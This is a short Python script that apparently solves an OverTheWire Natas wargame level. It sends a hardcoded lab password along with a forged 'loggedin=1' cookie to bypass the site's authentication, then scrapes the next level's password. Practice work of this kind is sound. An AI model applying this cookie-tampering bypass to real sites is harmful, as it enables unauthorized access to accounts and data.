#!/usr/bin/env python

from http import cookies
from urllib import response
import requests
import re

username = 'natas5'
password = 'Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD'

# headers = {"Referer" : "http://natas5.natas.labs.overthewire.org/"}
cookies = {"loggedin" : "1"}

url = 'http://%s.natas.labs.overthewire.org/' % username

response = requests.get(url, auth = (username, password), cookies = cookies)
content = response.text
# print(content)
print(re.findall('The password for natas6 is (.*)</div>',content)[0])